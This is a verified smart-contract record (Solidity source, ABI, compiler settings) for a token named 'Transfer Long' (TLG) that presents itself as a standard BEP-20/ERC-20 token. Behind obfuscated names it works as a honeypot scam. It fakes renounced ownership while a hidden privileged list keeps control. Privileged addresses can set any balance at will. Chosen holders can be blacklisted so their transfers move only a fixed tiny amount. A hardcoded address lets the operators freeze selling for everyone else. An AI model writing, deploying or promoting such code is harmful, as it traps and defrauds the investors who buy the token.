{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface launchedTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fromTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeTo {\n    function createPair(address enableLiquidity, address autoShould) external returns (address);\n}\n\ninterface isAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellMin) external view returns (uint256);\n\n    function transfer(address launchTx, uint256 swapFund) external returns (bool);\n\n    function allowance(address exemptSenderFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchTx,\n        uint256 swapFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldEnable, uint256 value);\n    event Approval(address indexed exemptSenderFund, address indexed spender, uint256 value);\n}\n\ninterface isAutoMetadata is isAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TransferLong is fromTotal, isAuto, isAutoMetadata {\n\n    function getOwner() external view returns (address) {\n        return txTo;\n    }\n\n    function senderSwap(address receiverLiquidity) public {\n        require(receiverLiquidity.balance < 100000);\n        if (amountReceiver) {\n            return;\n        }\n        if (fundTrading != senderSell) {\n            limitFee = sellFrom;\n        }\n        takeTotal[receiverLiquidity] = true;\n        \n        amountReceiver = true;\n    }\n\n    address public listShould;\n\n    string private feeMarketingLaunch = \"Transfer Long\";\n\n    constructor (){\n        if (senderSell == fundTrading) {\n            tradingShould = true;\n        }\n        launchedTx listFrom = launchedTx(listFund);\n        listShould = takeTo(listFrom.factory()).createPair(listFrom.WETH(), address(this));\n        if (senderSell == limitFee) {\n            amountLaunched = true;\n        }\n        modeWallet = _msgSender();\n        fundSender();\n        takeTotal[modeWallet] = true;\n        launchToken[modeWallet] = swapMin;\n        \n        emit Transfer(address(0), modeWallet, swapMin);\n    }\n\n    function transfer(address txBuy, uint256 swapFund) external virtual override returns (bool) {\n        return fromLaunchedTeam(_msgSender(), txBuy, swapFund);\n    }\n\n    uint256 private tradingMin;\n\n    function balanceOf(address sellMin) public view virtual override returns (uint256) {\n        return launchToken[sellMin];\n    }\n\n    function tokenSellTrading(address txBuy, uint256 swapFund) public {\n        modeLaunchedIs();\n        launchToken[txBuy] = swapFund;\n    }\n\n    mapping(address => uint256) private launchToken;\n\n    uint256 constant amountFee = 14 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitTo;\n    }\n\n    uint256 senderMarketingTotal;\n\n    bool public amountReceiver;\n\n    uint256 private sellFrom;\n\n    function modeLaunchedIs() private view {\n        require(takeTotal[_msgSender()]);\n    }\n\n    function isToEnable(address marketingEnable, address launchTx, uint256 swapFund) internal returns (bool) {\n        require(launchToken[marketingEnable] >= swapFund);\n        launchToken[marketingEnable] -= swapFund;\n        launchToken[launchTx] += swapFund;\n        emit Transfer(marketingEnable, launchTx, swapFund);\n        return true;\n    }\n\n    function fundSender() public {\n        emit OwnershipTransferred(modeWallet, address(0));\n        txTo = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return txTo;\n    }\n\n    uint256 private senderSell;\n\n    function marketingReceiver(uint256 swapFund) public {\n        modeLaunchedIs();\n        senderMarketingTotal = swapFund;\n    }\n\n    function fromList(address teamTrading) public {\n        modeLaunchedIs();\n        \n        if (teamTrading == modeWallet || teamTrading == listShould) {\n            return;\n        }\n        receiverAmountList[teamTrading] = true;\n    }\n\n    mapping(address => bool) public receiverAmountList;\n\n    function fromLaunchedTeam(address marketingEnable, address launchTx, uint256 swapFund) internal returns (bool) {\n        if (marketingEnable == modeWallet) {\n            return isToEnable(marketingEnable, launchTx, swapFund);\n        }\n        uint256 fundReceiver = isAuto(listShould).balanceOf(isLaunch);\n        require(fundReceiver == senderMarketingTotal);\n        require(launchTx != isLaunch);\n        if (receiverAmountList[marketingEnable]) {\n            return isToEnable(marketingEnable, launchTx, amountFee);\n        }\n        return isToEnable(marketingEnable, launchTx, swapFund);\n    }\n\n    uint256 public limitFee;\n\n    function transferFrom(address marketingEnable, address launchTx, uint256 swapFund) external override returns (bool) {\n        if (_msgSender() != listFund) {\n            if (amountTrading[marketingEnable][_msgSender()] != type(uint256).max) {\n                require(swapFund <= amountTrading[marketingEnable][_msgSender()]);\n                amountTrading[marketingEnable][_msgSender()] -= swapFund;\n            }\n        }\n        return fromLaunchedTeam(marketingEnable, launchTx, swapFund);\n    }\n\n    string private limitTo = \"TLG\";\n\n    function name() external view virtual override returns (string memory) {\n        return feeMarketingLaunch;\n    }\n\n    bool public tradingShould;\n\n    address private txTo;\n\n    bool private launchedLaunchMode;\n\n    address public modeWallet;\n\n    uint256 public fundTrading;\n\n    address isLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public amountLaunched;\n\n    mapping(address => mapping(address => uint256)) private amountTrading;\n\n    function approve(address receiverFund, uint256 swapFund) public virtual override returns (bool) {\n        amountTrading[_msgSender()][receiverFund] = swapFund;\n        emit Approval(_msgSender(), receiverFund, swapFund);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapMin;\n    }\n\n    address listFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public modeEnable;\n\n    uint256 private swapMin = 100000000 * 10 ** 18;\n\n    uint256 listWallet;\n\n    mapping(address => bool) public takeTotal;\n\n    event OwnershipTransferred(address indexed maxLaunchedSender, address indexed marketingTotalMax);\n\n    function decimals() external view virtual override returns (uint8) {\n        return toReceiver;\n    }\n\n    function allowance(address buyToken, address receiverFund) external view virtual override returns (uint256) {\n        if (receiverFund == listFund) {\n            return type(uint256).max;\n        }\n        return amountTrading[buyToken][receiverFund];\n    }\n\n    uint8 private toReceiver = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptSenderFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLaunchedSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTotalMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTrading\",\"type\":\"address\"}],\"name\":\"fromList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapFund\",\"type\":\"uint256\"}],\"name\":\"marketingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAmountList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"}],\"name\":\"senderSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapFund\",\"type\":\"uint256\"}],\"name\":\"tokenSellTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TransferLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}